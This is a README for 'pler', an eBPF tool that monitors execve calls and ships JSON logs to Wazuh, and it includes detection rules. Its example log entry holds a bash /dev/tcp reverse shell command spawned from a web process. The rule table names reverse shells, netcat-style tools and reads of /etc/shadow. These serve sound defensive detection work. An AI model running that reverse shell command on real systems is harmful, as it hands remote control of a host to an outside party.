# pler

eBPF-based real-time `execve` syscall monitor for production SOC environments. Captures every process execution on the host and writes structured JSON logs to `/var/log/pler/execve.log` for Wazuh Agent to ship to Wazuh Manager.

## Features

- **Zero-dependency binary** — single static binary, no runtime dependencies on target machines
- **CO-RE** — one binary runs on all supported kernels without recompiling
- **Full execve visibility** — captures pid, ppid, uid, gid, username, group, comm, filename, argv, cwd, cgroup, netns, retval
- **Tamper protection** — log file locked append-only via `chattr +a`
- **Wazuh-ready** — ships with decoder, 11 detection rules, and `ossec.conf` snippet
- **Low overhead** — eBPF perf ring buffer, buffered disk writes, drop counter with alert

## Requirements

| Distro | Kernel | Notes |
|---|---|---|
| Ubuntu 20.04+ | 5.4, 5.15, 6.x | BTF available by default |
| Debian 11+ | 5.10, 6.x | BTF available by default |
| RHEL / Rocky / Alma 8+ | 4.18+ | Requires `CONFIG_DEBUG_INFO_BTF=y` |
| RHEL / Rocky / Alma 9+ | 5.14+ | BTF available by default |

Verify BTF availability: `ls /sys/kernel/btf/vmlinux`

## Installation

### Debian / Ubuntu

```bash
wget https://github.com/adriyansyah-mf/Pler/releases/latest/download/pler_1.0.0_amd64.deb
sudo dpkg -i pler_1.0.0_amd64.deb
```

### RHEL / Rocky / Alma

```bash
wget https://github.com/adriyansyah-mf/Pler/releases/latest/download/pler-1.0.0-1.x86_64.rpm
sudo rpm -i pler-1.0.0-1.x86_64.rpm
```

### Manual

```bash
wget https://github.com/adriyansyah-mf/Pler/releases/latest/download/pler_1.0.0_linux_amd64.tar.gz
tar xzf pler_1.0.0_linux_amd64.tar.gz
sudo install -m 0755 pler /usr/bin/pler
```

## Usage

```bash
# Start via systemd (installed via package)
sudo systemctl enable --now pler
sudo systemctl status pler

# Watch live log
sudo tail -f /var/log/pler/execve.log | jq .

# Check drop counter (ring buffer overflow indicator)
echo | nc -U /run/pler/metrics.sock
```

## Log Format

One JSON object per line:

```json
{
  "timestamp":      "2026-06-27T03:14:22.841Z",
  "hostname":       "web01",
  "program":        "pler",
  "event_type":     "execve",
  "pid":            9142,
  "ppid":           1823,
  "uid":            33,
  "gid":            33,
  "username":       "www-data",
  "group":          "www-data",
  "comm":           "sh",
  "filename":       "/bin/sh",
  "argv":           "sh -c bash -i >& /dev/tcp/10.10.10.99/4444 0>&1",
  "argv_truncated": false,
  "retval":         0,
  "success":        true,
  "cwd":            "/var/www/html/uploads",
  "cgroup":         "system.slice/php8.1-fpm.service",
  "netns":          4026531992
}
```

## Configuration

`/etc/pler/config.yaml`:

```yaml
log_file:       /var/log/pler/execve.log
ringbuf_size:   4194304   # 4 MB perf ring buffer
flush_interval: 100ms     # max latency before flush
flush_size:     65536     # 64 KB flush threshold
max_args:       20        # max argv entries captured
arg_size:       128       # max bytes per arg
exclude_comms:  []        # opt-in comm filter (e.g. ["node", "python3"])
```

## Wazuh Integration

### On each Wazuh Agent

Add to `/var/ossec/etc/ossec.conf` inside `<ossec_config>`:

```bash
sudo cat /usr/share/pler/wazuh/ossec_localfile.conf >> /var/ossec/etc/ossec.conf
sudo systemctl restart wazuh-agent
```

### On Wazuh Manager

```bash
sudo cp /usr/share/pler/wazuh/pler_decoder.xml /var/ossec/etc/decoders/
sudo cp /usr/share/pler/wazuh/pler_rules.xml   /var/ossec/etc/rules/
sudo systemctl reload wazuh-manager
```

### Detection Rules

| Rule ID | Level | Description |
|---|---|---|
| 100100 | 0 | Base: all execve events |
| 100101 | 3 | Failed execve (reconnaissance) |
| 100102 | 5 | Recon burst — same tool 5× in 10s |
| 100110 | 10 | Shell spawned from web process |
| 100111 | 13 | `/dev/tcp` reverse shell in argv |
| 100112 | 12 | Network tool (nc/ncat/socat) from web process |
| 100113 | 11 | Interpreter with socket connect in argv |
| 100120 | 10 | Non-root reading `/etc/shadow` or `/etc/passwd` |
| 100130 | 8 | Shell history evasion |
| 100140 | 9 | sudo/su from web process |
| 100199 | 12 | Ring buffer overflow — visibility gap |

## Building from Source

**Requirements (build machine only):** Go 1.22+, clang/llvm, bpftool, libbpf-dev, nfpm

```bash
git clone https://github.com/adriyansyah-mf/Pler.git
cd Pler

# Generate eBPF bindings + build binary
make build

# Run unit tests
make test

# Build .deb + .rpm + .tar.gz
make release
```

## Performance

On a typical web/app server (10–50 execve/s):

| Metric | Value |
|---|---|
| CPU overhead | < 1% |
| Memory | ~15 MB RSS |
| Log size (compressed) | ~35–170 MB/day |
| Perf ring buffer | 4 MB default (tunable) |

## Known Limitations

- **Fileless / shellcode attacks** — not detectable via execve monitoring alone
- **argv truncation** — args longer than 128 bytes are truncated; `argv_truncated: true` is set
- **Ring buffer overflow** — high burst of execve events can cause drops; rule 100199 alerts on this
- **BTF required** — kernel must have `CONFIG_DEBUG_INFO_BTF=y`; most modern distros do

## License

GPL-2.0
